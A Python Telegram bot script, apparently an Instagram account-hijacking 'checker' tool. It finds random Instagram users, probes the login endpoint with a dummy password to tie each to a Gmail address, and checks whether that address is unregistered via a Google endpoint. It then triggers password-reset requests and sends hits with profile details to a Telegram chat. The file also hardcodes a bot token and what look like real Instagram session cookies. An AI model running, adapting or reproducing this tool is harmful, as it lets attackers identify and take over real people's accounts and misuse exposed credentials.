import requests
from time import sleep
import telebot
from telebot import types
import time
import random
from uuid import uuid4
import json
import os
j=0
v=0
h=0
vv=0
cc=0
us=0
bb="QWERTYUIOPLKJHGFDSAZXCVBNM0987654321qwhghnbhnbmm"
token = "6762979530:AAG5DMNhpKxJC7ITbrPd-1qI-QzF4k7su4w"
os.system('clear')
bot = telebot.TeleBot(token)
@bot.message_handler(commands=['start'])
def start(message):
    START = types.InlineKeyboardButton(text ="Click Start", callback_data = 'START')
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(START)
    bot.send_message(message.chat.id,text=f"Welcome To BoT Checker Hunt v3 🇮🇶",parse_mode="markdown",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def clase(call):
	if call.data=='START':
		ref= types.InlineKeyboardButton(text ="Click Start To Check!", callback_data = 'ref')
		maac2= types.InlineKeyboardMarkup()
		maac2.row_width = 2
		maac2.add(ref)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"*hi in Bot aBooD 🇮🇶\n\n@kckkkkc*",parse_mode="markdown",reply_markup=maac2)
	if call.data=="ref":
		 	cansl = types.InlineKeyboardButton(text =" Back ", callback_data = 'START')
		 	Keyy = types.InlineKeyboardMarkup()
		 	Keyy.row_width = 1
		 	Keyy.add(cansl)
		 	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"* Send Now (Bot)\n\n@kckkkkc*",parse_mode="markdown",reply_markup=Keyy)
		 	@bot.message_handler(func=lambda m:True )
		 	def com(message):
					user=message.text
					global bb,vv,cc,v,h,us,j
					message = call.message
					while True:
					   #number= random.choice(ok)
					   username = str(''.join(random.choice(bb)for i in range(7))).lower()
					   url=f'https://www.instagram.com/web/search/topsearch/?context=blended&query={username}&rank_token=0.38549261586414585&include_reel=true'
					   head11 = {
		        'accept': '*/*',
		        'accept-encoding': 'gzip, deflate, br',
		        'accept-language': 'en-US,en;q=0.9',
		       # 'content-length': '336',
		#        'content-type': 'application/x-www-form-urlencoded',
		        'cookie': 'ig_nrcb=1; mid=Yn0mhAABAAF67zpxcopyc_DiDqlW; ig_did=66C4F652-81B2-40FB-AD7E-98260457287F; fbm_124024574287414=base_domain=.instagram.com; csrftoken=B5EvgsGegpjkHbwakmeZzZeibMUyPXOo; ds_user_id=479320179; sessionid=479320179:YJP7Mp7LRlvDVe:17; shbid="6887\054479320179\0541685041134:01f78226f1ed25a1fd638da513ee9fc0bd85ad7b75335c66e00546dddc526839ed8673b3"; shbts="1653505134\054479320179\0541685041134:01f7359bb436c3c2a6a593d450045a6d47feeeb49309f4e3e34f16846a86521cd654f96c"; fbsr_124024574287414=-t_KkO2zVCJ8dtHJUTSp1hNWF4FvrBOMic2GrdYXfXo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRQmtRTDJLM0F6eC1NYUE5blBMQ3lrYXBONFVQYUU4RDJ3cG1GcmlJTjFqN0x4aVU1UWdtekFGcDEwaEtHZ2Y3RUdhY3VFNFBFMDdwN0VNWUtnTFVyT0lPbGNLN3BBWEExVDBCbjRtTnI2bVFSbFpBY0tuOWp4ZS1HNGd3QVk2bUZwdmZoeXVHeXV5U09ZcWtIVW83VWM3V1ZFUTdERG4wQU16dDN6WmVxckxYOGhVMXE2WnRqbEhvMlQwdVRHQzZ0SXpWak4wT3otNjUyU2pkQVRLbmZBcmM1MkEzeVQ2c0JmbGZUX2M3alQ4TWZuZU02b3NQcmZuTF9CVnptbWp4eVBYbm85alRDRUMyRzNGLWgyNE5Ua0Y4NkVZbDRFR1Q0NExqQkl3NnZfekdHYW5MckF3Q3dMVUJMMF81Mzd3bDlnIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUJ5SmR4WTE5T0t5M1pDQlpBTkJqaWc5d0M0bTlqSVdUZHdWVTdJa01PTjBXVkZ2ZXVpSE4waHZTamF4cXpaQTJxWkJzVXR6cXBMWkNwYzJNYzVJS0lUVW5DMHJNWWZuVDRVRVFhYWhaQ2JKZm03bEQ1Q1hNdE14bGVyV2FFRGZrT2U2Y0RSSmg2OWFtZlV4eGFVRmFHMGlkRHR3VnJZNXo1VzVMZ0U5Q2UiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY1MzUwNjE1NH0; rur="ASH\054479320179\0541685042266:01f7314545b2fc6431250d9f16c78ee257c43ef7fffb40f551f9109cef47d42ed774d508"',
		       # 'origin': 'https://www.instagram.com',
		        'referer': 'https://www.instagram.com/explore/search/',
		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		        'sec-ch-ua-mobile': '?0',
		        'sec-fetch-dest': 'empty',
		        'sec-fetch-mode': 'cors',
		        'sec-fetch-site': 'same-origin',
		        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
		        'x-asbd-id': '437806',
		        'x-csrftoken': 'B5EvgsGegpjkHbwakmeZzZeibMUyPXOo',
		        'x-ig-app-id': '936619743392459',
		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
		        #x-requested-with': 'caee87137ae9',
		        'x-requested-with': 'XMLHttpRequest'
					   }
					   data2={
		        	'context': 'blended',
		        	'query': '{}'.format(username),
		        	'rank_token': '0.38549261586414585',
		        	'include_reel': 'true'
					   }
					   y= requests.get(url,headers=head11).json()
					   try:
					    iddd = len(str(y['users'][0]['user']['pk']))
					    for ll in range(0,iddd):
					    	try:
					    			nn = str(y['users'][ll]['user']['username'])
					    			print(nn)
					    			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
					    			headers = {'User-Agent': 'Instagram 136.0.0.34.124 Android (24/5.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US)'}
					    			uid = str(uuid4())
					    			data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':'{}@gmail.com' .format(nn),
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
					    			}
					    			re = requests.post(url,headers=headers,data=data).text
					    			
					    				
					    			if ('"bad_password"') in re:
					    				url3 ='https://android.clients.google.com/setup/checkavail'
					    				headers = {
	        		'Content-Length':'98',
	        		'Content-Type':'text/plain; charset=UTF-8',
	        		'Host':'android.clients.google.com',
	        		'Connection':'Keep-Alive',
	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
					    				data= json.dumps({
	        		'username':'{}@gmail.com'.format(nn),
	        		'version':'3',
	        		'firstName':'AbaLahb',
	        		'lastName':'AbuJahl'
					    				})
					    				res=requests.post(url3,headers=headers,data=data)
					    				if res.json()['status'] =='SUCCESS':
					    					
					    					h+=1
					    					r = requests.get(f"https://api.dlyar-dev.tk/info-insta?user={nn}").json()
					    					try:
					    						
						    					nam= r['name']
						    					fols=r['following']
						    					fol =r['followers']
						    					post=r['post']
						    					id= r['id']
						    				except KeyError as error:
						    					us+=1
					    					rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
					    					ree = rl.json()
					    					da = ree['date']
					    					headers = {
        # 'Content-Length': '305',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',
        # Requests sorts cookies= alphabetically

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
        # 'Accept-Encoding': 'gzip',
					    					}
					    					data = {
        'ig_sig_key_version': '4',
        "user_id":id
					    					}
					    					res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
					    					rs =str(res['obfuscated_email'])
					    					j+=1

					    					msg=f"Hi Sir!! </> : {j}\nএ〔 𝗇𝖺𝗆𝖾 〕: {nam}\nএ〔 𝖾𝗆𝖺𝗂𝗅 〕: {nn}@gmail.com\nএ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝖾𝗋𝗌 〕: {fols}\nএ〔 𝖿𝗈𝗅𝗅𝗈𝗐𝗂𝗇𝗀 〕: {fol}\nএ〔 𝗉𝗈𝗌𝗍 〕: {post}\nএ〔 𝖽𝖺𝗍𝖾 〕: {da}\n𝗂𝖣 : {id}\n𝖱𝖾𝗌𝗍 : {rs}\n@kckkkkc"
					    					
					    					bot.send_message(message.chat.id, msg)
					    				elif res.json()['status'] =='USERNAME_UNAVAILABLE':
					    					cc+=1
					    			elif('"invalid_user"')in re:
														vv+=1
														aac = types.InlineKeyboardMarkup()
														aac.row_width = 2
														i12= types.InlineKeyboardButton(text =f"𓏺 𝖡𝖺𝖣 𝖦𝗆𝖺𝗂𝖫 | {cc} ", callback_data = 'c')
														i1= types.InlineKeyboardButton(text =f"𝖡𝖺𝖣 𝖨𝗇𝗌𝗍𝖺𝖦𝗋𝖺𝗆 | {vv}", callback_data = 'c')
														i11= types.InlineKeyboardButton(text =f"𝖣𝗈𝖭𝖾 | {h}", callback_data = 'c')
														i7= types.InlineKeyboardButton(text =f"𓏺 𝖤𝗋𝖱𝗈𝖱 𝗎𝖲𝖾𝖱𝗇𝖺𝖬𝖾 | {us}", callback_data = 'c')
														aac.add(i12,i1,i11,i7)
														bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="""Done Start Now""", reply_markup=aac)
					    	except IndexError as error:
					    		
					    		
					    		continue
					    
					   except IndexError as error:
					    continue
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
	       print(e)
	       sleep(10)			    	

